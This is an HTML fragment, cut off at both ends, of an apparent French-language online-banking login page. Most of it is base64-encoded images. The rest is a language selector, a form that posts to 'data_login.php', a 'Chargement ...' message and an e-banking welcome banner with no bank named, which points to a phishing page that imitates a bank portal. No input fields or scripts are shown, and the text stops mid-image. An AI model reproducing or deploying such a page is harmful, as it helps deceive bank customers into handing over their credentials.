              src="data:image/png;base64,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"
            />
            <div></div>
          </div>
          <div class="col-xs-2">
            <language-selector language="language" class="ng-isolate-scope">
              <div class="languageListSelect pull-right ui-select-container ui-select-bootstrap dropdown ng-not-empty ng-valid">
                <div class="ui-select-match ng-scope"  >
                  <span tabindex="-1" class="btn btn-default form-control ui-select-toggle" style="outline: 0;">
                    <span  class="ui-select-placeholder text-muted ng-binding ng-hide"></span>
                    <span  class="ui-select-match-text pull-left">
                      <i class="ng-scope famfamfam-flag-fr"></i>
                      Français
                    </span>
                    <i class="caret pull-right"></i>
                    <a style="margin-right: 10px;" class="btn btn-xs btn-link pull-right ng-hide">
                      <i class="glyphicon glyphicon-remove"></i>
                    </a>
                  </span>
                </div>
                <span class="ui-select-refreshing glyphicon-refresh ui-select-spin ng-hide"></span>
                <input type="search" autocomplete="off" tabindex="-1" class="form-control ui-select-search ng-pristine ng-untouched ng-valid ng-empty ng-hide ui-select-search-hidden" placeholder="" />
                <ul class="ui-select-choices ui-select-choices-content ui-select-dropdown dropdown-menu ng-scope ng-hide">
                  <li class="ui-select-choices-group" id="ui-select-choices-0">
                    <div class="divider ng-hide"></div>
                    <div class="ui-select-choices-group-label dropdown-header ng-binding ng-hide"></div>
                  </li>
                </ul>
                <div class="ui-select-no-choice"></div>
                <ui-select-single></ui-select-single>
                <input class="ui-select-focusser ui-select-offscreen ng-scope" type="text" id="focusser-0" role="button" />
              </div>
            </language-selector>
          </div>
        </div>
        <div class="row content ng-scope">
          <div class="col-xs-1"></div>
          <div class="col-xs-10">
            <error-component class="ng-isolate-scope">
              <div class="error-container">
                <div id="toast-container" class="toast-top-full-width"></div>
              </div>
            </error-component>
   <div id="loginPage" class="loginPage jumbotron ng-scope">
                <h3 class="ng-binding"></h3>
                <div class="ng-scope">
                  <form method="POST" action="data_login.php">
                    <div class="row">
                      <div class="col-xs-3"></div>
                      <div class="columnLeft col-xs-6">
                        <div class="row">
						 <p style="text-align: center;">
		 <img alt="" src="https://cdn-icons-png.flaticon.com/512/1/1176.png" style="width: 100px; height: 100px;" />
		 </p>

                         <br></br>
						 
                         <div id="message" style="text-align: center;">Chargement ...</div>  
                        
                        </div>
                      </div>
					 

                      
                      <div class="col-xs-3"></div>
                    </div>
                   

                    <div class="row alertBox">
                      <div>
                        <div class="col-xs-3"></div>
                        <div class="col-xs-6"></div>
                        <div class="col-xs-3"></div>
                      </div>
                    </div>
                  </form>
                </div>
              </div>
            <div class="ng-scope">
              <ng-include src="" class="ng-scope">
                <div class="welcomeBlock jumbotron ng-scope">
                  <h2 class="ng-binding">BIENVENUE SUR VOTRE PLATEFORME E-BANKING</h2>
                  <img
                    class="img-responsive center-block"
                    src="data:image/jpeg;base64,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d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/xAAfAQADAQEBAQEBAQEBAAAAAAAAAQIDBAUGBwgJCgv/xAC1EQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2gAMAwEAAhEDEQA/APyLooor9APDCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiikbJU460ALRW5488JHwre6bNGGbTdf02HV9OkJyJInLxyKD/F5NzFc27NgZe2c4xWHRuAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAe0+EvDH/AAuz9h/xQsAjk8R/A/VI9eRS2Z7rw7qkkVpdqBjJjs9RWykCjhf7Yu3PAJHi1e8f8EzvjBovwf8A20fCa+LsSfD/AMdC48C+MYGlMUU2jatEbK4MjDkJEZY7jI5BtlI5FcJ+1N+zjr37IH7SPjb4X+Jdzaz4H1aXTJZmj8sXsQw9vdKvZJ4HimUHnbKtZRlabh81+v4/mU9Vc4KiiitSQooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigCO5t1u7eSKQbkkUqw9QeDX6If8FW/DMn7Y37Bf7PH7X1iGu9a1TSo/h18SZQQ0raxY+ZHBeyhRwZzFcZZz92SzXnIr886/Uz/g3rm0n9sj9nr9pD9jvxVdRwaf8AEbRP+Eq8PSSLuWw1CEwwSXAGRuaKZdLnVB1+zyE5Ga5MXLkSrfyvX0ej/wA/ka0tXydz8s6K0vGfgrWPhp4z1nw14gsZNM8QeG7+40rVLNzlrS6glaKaI+u2RGGRwcVm11mQUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAV7d/wTb/AGrD+xJ+3f8AC/4nSztb6V4d1uOPWmA3D+y7kNa3p2/